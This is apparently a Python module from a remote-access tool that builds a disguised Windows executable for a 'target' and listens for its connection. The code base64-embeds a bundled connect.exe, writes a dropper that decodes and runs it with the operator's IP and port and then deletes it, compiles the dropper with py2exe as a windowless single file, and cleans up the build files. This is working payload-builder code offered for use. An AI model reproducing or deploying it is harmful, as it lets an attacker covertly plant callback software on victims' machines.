import sys,os,subprocess,shutil
from Server.server import connecter,recevoir,fermer,get_ip_address,find_first_available_port

def generateExe(destination,global_port,ip_address):

    connect = 'include\\connect.exe'
    py2exe = 'include\\python\\App\\python.exe'

    
    paths = [os.path.join(destination,'cible.exe')]

    print(paths)
    for file_path in paths:
        if os.path.exists(file_path):
            os.remove(file_path)
            print(f"{file_path} has been deleted.")
        else:
            print(f"The file {file_path} does not exist.")

    # Check if running from a bundled executable
    if getattr(sys, 'frozen', False):
        # If frozen (PyInstaller), get the path to the extracted files
        connect = os.path.join(sys._MEIPASS, connect)
        py2exe = os.path.join(sys._MEIPASS, py2exe)

    setup = f'''from distutils.core import setup
import py2exe
setup(
options={{
    'py2exe': {{
        'bundle_files': 1,  # Optional: bundles dependencies into the executable
        'compressed': True, # Compresses the library archive into a .zip file
    }}
}},
windows=[{{'script': 'cible.py'}}],  # Replace 'your_script.py' with your Python script name
zipfile=None,  # Embeds the zip archive into the .exe
)
'''
    
    import base64

    chunks = []

    with open(connect, 'rb') as file:
        while True:
            chunk = file.read(1024*1024)
            if not chunk:
                break  # End of file
            
            # Encode the chunk in base64
            encoded_chunk = base64.b64encode(chunk).decode('utf-8')
            chunks.append(encoded_chunk)

    script = f'''chunks = {chunks}
import os,base64
try:
    decoded_data = b''
    # Decode the base64 string into binary data
    for chunk in chunks:
        decoded_chunk = base64.b64decode(chunk)
        decoded_data += decoded_chunk  # Append the decoded chunk to the final result
except (base64.binascii.Error, ValueError) as e:
    # Catch base64 decoding errors
    raise ValueError("Error decoding base64 data:",e)
with open('connect.exe', 'wb') as output_file:
    output_file.write(decoded_data)
dict = {{}}
command = '.\\\\connect.exe set-parameter {ip_address} {global_port}'
try:
    # Execute the command
    exit_code = os.system(command)
    # Check if the command was successful (exit code 0 means success)
    if exit_code != 0:
        print("Command failed with exit code",exit_code)
    else:
        print("Command executed successfully")
except Exception as e:
    # Handle any exceptions that occur during command execution
    print("An error occurred while executing the command: " + str(e) )
file_path = 'connect.exe'
if os.path.exists(file_path):
    os.remove(file_path)
    print("connect.exe has been deleted.")
else:
    print("The file does not exist.")
'''
    
    file_name = 'cible.py'

    with open(file_name,'w',encoding='UTF-8') as file:
        file.write(script)
        file.close

    file_name = 'setup.py'

    with open(file_name,'w',encoding='UTF-8') as file:
        file.write(setup)
        file.close

    subprocess.run([py2exe,'setup.py','py2exe'],
                creationflags=subprocess.CREATE_NO_WINDOW,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE)

    source_path = 'dist/cible.exe'

    try:
        # Move the file to the new location
        shutil.move(source_path, destination)
        print(f'File moved successfully to {destination}')
    except FileNotFoundError:
        print('Source file not found.')
    except PermissionError:
        print('Permission denied.')
    except Exception as e:
        print(f'An error occurred: {e}')

    # Path to the directory
    paths = ['setup.py','cible.py']

    for file_path in paths:
        if os.path.exists(file_path):
            os.remove(file_path)
            print(f"{file_path} has been deleted.")
        else:
            print("The file does not exist.")

    # Path to the directory
    paths = ['dist','build']

    for dir_path in paths:
        # Check if the directory exists
        if os.path.exists(dir_path) and os.path.isdir(dir_path):
            shutil.rmtree(dir_path)
            print(f"The directory {dir_path} and all its contents have been deleted.")
        else:
            print("The directory does not exist.")

def listen(global_port):

        connecter(global_port)
        results=recevoir()
        print("Starting to listen...")

        return results



